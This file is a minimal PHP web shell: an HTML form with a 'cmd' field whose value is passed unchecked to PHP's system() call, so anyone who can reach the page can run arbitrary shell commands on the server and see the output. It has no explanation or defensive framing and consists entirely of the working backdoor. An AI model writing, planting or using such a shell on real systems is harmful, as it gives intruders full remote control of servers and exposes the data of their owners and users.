<html>
<body>
<form method="GET" name ="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name ="cmd" autofocus id ="cmd" size="100">
<input type="SUMIT" value="Execute">
</form>
<pre>
    <?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>